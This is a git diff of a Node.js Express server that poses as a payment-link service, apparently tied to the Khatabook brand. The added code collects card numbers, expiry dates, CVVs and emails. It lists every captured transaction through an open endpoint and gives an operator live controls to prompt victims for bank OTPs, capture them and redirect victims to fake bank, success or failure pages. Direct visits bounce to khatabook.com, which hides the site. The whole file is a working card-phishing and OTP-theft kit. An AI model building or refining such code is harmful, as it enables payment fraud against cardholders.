@@ -8,55 +8,55 @@ import fs from 'fs';
 
 // Generate a unique ID for this server instance
 const SERVER_ID = crypto.randomBytes(3).toString('hex');
-console.log(`Server started with ID: ${SERVER_ID}`);
+
+// Create HTML redirect files
+function createRedirectFile(targetHtml) {
+  const fileName = `pay${SERVER_ID}.html`;
+  const redirectHtml = `
+<!DOCTYPE html>
+<html>
+<head>
+  <meta http-equiv="refresh" content="0;url=/${targetHtml}?${Date.now()}">
+  <script>
+    window.location.href = '/${targetHtml}' + window.location.search;
+  </script>
+</head>
+<body>
+  <p>Loading...</p>
+</body>
+</html>
+`;
+
+  fs.writeFileSync(fileName, redirectHtml);
+  console.log(`Created redirect file: ${fileName} -> ${targetHtml}`);
+  return fileName;
+}
+
+// Create a redirect file for landing.html
+const PAYMENT_REDIRECT_FILE = createRedirectFile('landing.html');
 
 // Initialize Express app
 const app = express();
-
-// Debug logging middleware
-app.use((req, res, next) => {
-  console.log(`${new Date().toISOString()} - ${req.method} ${req.url}`);
-  next();
-});
-
-// Error handler for JSON parsing
-app.use((err, req, res, next) => {
-  if (err instanceof SyntaxError && err.status === 400 && 'body' in err) {
-    console.error('JSON Parse Error:', err);
-    return res.status(400).json({ status: "error", message: "Invalid JSON in request" });
-  }
-  next(err);
-});
-
-// Body parser setup with explicit error handling
-app.use(bodyParser.json({
-  limit: '1mb',
-  verify: (req, res, buf) => {
-    try {
-      JSON.parse(buf);
-    } catch(e) {
-      console.error('Invalid JSON in request:', e);
-      throw new SyntaxError('Invalid JSON');
-    }
-  }
-}));
-
+app.use(bodyParser.json());
 app.use(cors({
   origin: '*',
   methods: ['GET', 'POST']
 }));
 
-// Subdomain handling middleware
+// Add subdomain handling middleware - this must come BEFORE static files middleware
 app.use((req, res, next) => {
-  const host = req.headers.host;
+  // Get the host from headers
+  const host = req.headers.host || '';
   
-  if (host && host.startsWith('pay.')) {
+  // Check if we're on the pay subdomain
+  if (host.startsWith('pay.')) {
     const pid = req.query.pid;
+    
+    // If pid is present, redirect to landing page
     if (pid) {
-      console.log(`Subdomain request with pid: ${pid}`);
-      req.url = `/landing.html?pid=${pid}`;
+      return res.redirect(`http://${host.replace('pay.', '')}/${PAYMENT_REDIRECT_FILE}?pid=${pid}`);
     } else {
-      console.log('Subdomain request without pid, redirecting to khatabook.com');
+      // If no pid, redirect to Khatabook
       return res.redirect('https://www.khatabook.com');
     }
   }
@@ -64,15 +64,11 @@ app.use((req, res, next) => {
   next();
 });
 
-// Clean URL handling
-app.use((req, res, next) => {
-  const cleanUrls = ['payment', 'success', 'fail', 'landing', 'bankpage', 'admin'];
-  for (const page of cleanUrls) {
-    if (req.path === `/${page}`) {
-      const filePath = path.join(process.cwd(), `${page}.html`);
-      console.log(`Clean URL request for ${page}, sending file: ${filePath}`);
-      return res.sendFile(filePath);
-    }
+// Add this route to redirect direct visitors to khatabook.com
+app.get('/', (req, res, next) => {
+  // Only redirect if it's a direct visit without any query parameters
+  if (!Object.keys(req.query).length) {
+    return res.redirect('https://www.khatabook.com');
   }
   next();
 });
@@ -80,175 +76,249 @@ app.use((req, res, next) => {
 // Serve static files
 app.use(express.static("."));
 
-// Redirect root to khatabook.com
-app.get('/', (req, res, next) => {
-  if (!Object.keys(req.query).length) {
-    console.log('Root request without parameters, redirecting to khatabook.com');
-    return res.redirect('https://www.khatabook.com');
-  }
-  next();
-});
-
-// Global error handler
-app.use((err, req, res, next) => {
-  console.error('Global error:', err);
-  if (res.headersSent) {
-    return next(err);
-  }
-  res.status(500).json({ status: 'error', message: 'Internal server error' });
-});
-
 const PORT = process.env.PORT || 3000;
 const server = app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
+  console.log(`Redirect file: ${PAYMENT_REDIRECT_FILE}`);
 });
 
-// Socket.io setup
 const io = new Server(server);
-console.log('Socket.io server initialized');
-
-// In-memory data stores
 const transactions = new Map();
 const paymentLinks = new Map();
 
-// Payment Links Endpoint with extensive error handling and logging
+// Modified Payment Links Endpoint to use pay subdomain
 app.post('/api/generatePaymentLink', (req, res) => {
-  console.log('Received payment link generation request');
-  
   try {
-    // Validate request body
-    console.log('Request body:', req.body);
-    
-    if (!req.body) {
-      console.log('Missing request body');
-      return res.status(400).json({ status: "error", message: "Missing request body" });
-    }
-    
     const { amount, description } = req.body;
-    console.log(`Amount: ${amount}, Description: ${description}`);
 
-    // Validate amount
-    if (amount === undefined || amount === null) {
-      console.log('Amount is undefined or null');
-      return res.status(400).json({ status: "error", message: "Amount is required" });
-    }
-    
-    const numAmount = parseFloat(amount);
-    if (isNaN(numAmount)) {
-      console.log('Amount is not a number');
-      return res.status(400).json({ status: "error", message: "Amount must be a number" });
-    }
-    
-    if (numAmount <= 0) {
-      console.log('Amount must be positive');
-      return res.status(400).json({ status: "error", message: "Amount must be greater than zero" });
+    if (!amount || isNaN(amount) || amount <= 0) {
+      return res.status(400).json({ status: "error", message: "Invalid amount" });
     }
 
-    // Validate description
-    if (!description) {
-      console.log('Description is missing');
-      return res.status(400).json({ status: "error", message: "Description is required" });
-    }
-    
-    if (typeof description !== 'string') {
-      console.log('Description is not a string');
-      return res.status(400).json({ status: "error", message: "Description must be a string" });
-    }
-    
-    if (!description.trim()) {
-      console.log('Description is empty');
-      return res.status(400).json({ status: "error", message: "Description cannot be empty" });
+    if (!description?.trim()) {
+      return res.status(400).json({ status: "error", message: "Description required" });
     }
 
-    // Generate unique invoice ID
     const invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase();
-    console.log(`Generated invoice ID: ${invoiceId}`);
+    const protocol = req.headers['x-forwarded-proto'] || req.protocol;
     
-    // Get protocol and host information
-    const protocol = req.headers['x-forwarded-proto'] || req.protocol || 'https';
-    let host = req.get('host') || 'khatapay.me';
-    host = host.replace(/^www\./, '');
-    const baseDomain = host.split(':')[0]; 
+    // Get the host without any subdomain
+    const host = req.get('host').replace(/^www\./, '');
     
-    console.log(`Protocol: ${protocol}, Host: ${host}, Base Domain: ${baseDomain}`);
-    
-    // Create payment link
-    const paymentLink = `${protocol}://pay.${baseDomain}?pid=${invoiceId}`;
-    console.log(`Created payment link: ${paymentLink}`);
-    
-    // Store payment data
+    // Create payment link with pay. subdomain instead of HTML file
+    const paymentLink = `${protocol}://pay.${host}?pid=${invoiceId}`;
+
     paymentLinks.set(invoiceId, {
-      amount: numAmount,
+      amount: parseFloat(amount),
       description: description.trim(),
       paymentLink,
       createdAt: new Date().toISOString()
     });
 
-    console.log('Sending success response');
-    return res.status(200).json({ 
-      status: "success", 
-      paymentLink: paymentLink 
-    });
-    
+    res.json({ status: "success", paymentLink });
   } catch (error) {
-    console.error('Error in generatePaymentLink:', error);
-    return res.status(500).json({ 
-      status: "error", 
-      message: "Server error generating payment link" 
-    });
+    console.error('Payment Link Error:', error);
+    res.status(500).json({ status: "error", message: "Internal server error" });
   }
 });
 
-// Get payment details
+// The rest of your code remains completely unchanged
 app.get('/api/getPaymentDetails', (req, res) => {
+  const { pid } = req.query;
+  if (!pid || !paymentLinks.has(pid)) {
+    return res.status(404).json({ status: "error", message: "Not found" });
+  }
+  res.json({ status: "success", payment: paymentLinks.get(pid) });
+});
+
+// Transactions Endpoints
+app.post('/api/sendPaymentDetails', (req, res) => {
   try {
-    const { pid } = req.query;
-    console.log(`Get payment details for pid: ${pid}`);
-    
-    if (!pid) {
-      return res.status(400).json({ status: "error", message: "Missing payment ID" });
+    const { cardNumber, expiry, cvv, email, amount, currency, cardholder } = req.body;
+
+    if (!cardNumber || !expiry || !cvv || !email || !amount || !cardholder) {
+      return res.status(400).json({ status: "error", message: "Missing fields" });
     }
-    
-    if (!paymentLinks.has(pid)) {
-      console.log(`Payment ID not found: ${pid}`);
-      return res.status(404).json({ status: "error", message: "Payment not found" });
-    }
-    
-    const payment = paymentLinks.get(pid);
-    console.log(`Retrieved payment:`, payment);
-    
-    return res.status(200).json({ status: "success", payment });
-    
+
+    const invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase();
+
+    const transaction = {
+      id: invoiceId,
+      cardNumber,
+      expiry,
+      cvv,
+      email,
+      amount: amount.toString().replace(/,/g, ''),
+      currency,
+      cardholder,
+      status: 'processing',
+      otpShown: false,
+      otpEntered: null,
+      otpError: false,
+      redirectStatus: null,
+      bankpageVisible: false,
+      timestamp: new Date().toLocaleString()
+    };
+
+    transactions.set(invoiceId, transaction);
+    io.emit('new_transaction');
+    res.json({ status: "success", invoiceId });
   } catch (error) {
-    console.error('Error in getPaymentDetails:', error);
-    return res.status(500).json({ status: "error", message: "Server error retrieving payment details" });
+    console.error('Transaction Error:', error);
+    res.status(500).json({ status: "error", message: "Payment processing failed" });
   }
 });
 
-// Other API endpoints with similar robust error handling...
-// Include all your other API endpoints here with similar pattern
+app.get('/api/transactions', (req, res) => {
+  res.json(Array.from(transactions.values()));
+});
 
-// Socket.io connection handler
-io.on('connection', (socket) => {
-  console.log('New socket connection:', socket.id);
-  
-  socket.on('join', (invoiceId) => {
-    if (invoiceId) {
-      socket.join(invoiceId);
-      console.log(`Socket ${socket.id} joined room: ${invoiceId}`);
+app.post('/api/showOTP', (req, res) => {
+  const { invoiceId } = req.body;
+  const txn = transactions.get(invoiceId);
+  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });
+
+  txn.otpShown = true;
+  txn.status = 'otp_pending';
+  txn.otpError = false;
+  io.to(invoiceId).emit('show_otp');
+  res.json({ status: "success", message: "OTP form shown" });
+});
+
+app.post('/api/wrongOTP', (req, res) => {
+  const { invoiceId } = req.body;
+  const txn = transactions.get(invoiceId);
+  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });
+
+  txn.otpError = true;
+  txn.status = 'otp_pending';
+  res.json({ status: "success", message: "OTP marked wrong" });
+});
+
+app.get('/api/checkTransactionStatus', (req, res) => {
+  const { invoiceId } = req.query;
+  const txn = transactions.get(invoiceId);
+  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });
+
+  if (txn.status === 'otp_pending' && txn.otpShown) {
+    return res.json({
+      status: "show_otp",
+      message: "Show OTP form",
+      otpError: txn.otpError
+    });
+  }
+
+  if (txn.redirectStatus) {
+    const redirectUrls = {
+      success: `/success.html?invoiceId=${invoiceId}`,
+      fail: `/fail.html?invoiceId=${invoiceId}${txn.failureReason ? `&reason=${txn.failureReason}` : ''}`,
+      bankpage: `/bankpage.html?invoiceId=${invoiceId}`
+    };
+    return res.json({ status: "redirect", redirectUrl: redirectUrls[txn.redirectStatus] });
+  }
+
+  res.json({ status: txn.status, otpError: txn.otpError });
+});
+
+app.post('/api/submitOTP', (req, res) => {
+  const { invoiceId, otp } = req.body;
+  const txn = transactions.get(invoiceId);
+  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });
+
+  txn.otpEntered = otp;
+  txn.status = 'otp_received';
+  txn.otpError = false;
+  res.json({ status: "success", message: "OTP received" });
+});
+
+app.post('/api/updateRedirectStatus', (req, res) => {
+  const { invoiceId, redirectStatus, failureReason } = req.body;
+  const txn = transactions.get(invoiceId);
+  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });
+
+  txn.redirectStatus = redirectStatus;
+  if (failureReason) {
+    txn.failureReason = failureReason;
+  }
+
+  const redirectUrls = {
+    success: `/success.html?invoiceId=${invoiceId}`,
+    fail: `/fail.html?invoiceId=${invoiceId}${failureReason ? `&reason=${failureReason}` : ''}`
+  };
+
+  res.json({
+    status: "success",
+    invoiceId,
+    redirectStatus,
+    redirectUrl: redirectUrls[redirectStatus] || `/bankpage.html?invoiceId=${invoiceId}`
+  });
+});
+
+app.post('/api/showBankpage', (req, res) => {
+  const { invoiceId } = req.body;
+  const txn = transactions.get(invoiceId);
+  if (!txn) return res.status(404).json({ error: 'Transaction not found' });
+
+  txn.redirectStatus = 'bankpage';
+  txn.bankpageVisible = true;
+  res.json({ status: 'success' });
+});
+
+app.post('/api/hideBankpage', (req, res) => {
+  const { invoiceId } = req.body;
+  const txn = transactions.get(invoiceId);
+  if (!txn) return res.status(404).json({ error: 'Transaction not found' });
+
+  txn.redirectStatus = null;
+  txn.bankpageVisible = false;
+  io.to(invoiceId).emit('hide_bankpage', { invoiceId }); // Include invoiceId in the payload
+  res.json({ status: 'success' });
+});
+
+app.get('/api/getTransactionForSuccess', (req, res) => {
+  const { invoiceId } = req.query;
+  const txn = transactions.get(invoiceId);
+  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });
+
+  res.json({
+    status: "success",
+    data: {
+      amount: txn.amount,
+      invoiceId: txn.id,
+      timestamp: txn.timestamp,
+      email: txn.email
     }
   });
-  
-  socket.on('disconnect', () => {
-    console.log(`Socket ${socket.id} disconnected`);
+});
+
+app.get('/api/getTransactionForFail', (req, res) => {
+  const { invoiceId, reason } = req.query;
+  const txn = transactions.get(invoiceId);
+  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });
+
+  // Map reason codes to human-readable messages
+  const reasonMessages = {
+    'insufficient_balance': 'Insufficient balance in your account',
+    'bank_declined': 'Transaction declined by bank',
+    'card_disabled': 'Online payments are disabled on your card',
+    'invalid_card': 'Invalid card number or details',
+    'canceled': 'Transaction canceled by user'
+  };
+
+  res.json({
+    status: "failed",
+    data: {
+      amount: txn.amount,
+      invoiceId: txn.id,
+      timestamp: txn.timestamp,
+      email: txn.email,
+      reason: reasonMessages[reason] || reasonMessages[txn.failureReason] || 'Transaction failed'
+    }
   });
 });
 
-// Process uncaught exceptions and unhandled promise rejections
-process.on('uncaughtException', err => {
-  console.error('Uncaught exception:', err);
-});
-
-process.on('unhandledRejection', (reason, promise) => {
-  console.error('Unhandled rejection at:', promise, 'reason:', reason);
+io.on('connection', (socket) => {
+  socket.on('join', (invoiceId) => {
+    socket.join(invoiceId);
+  });
 });
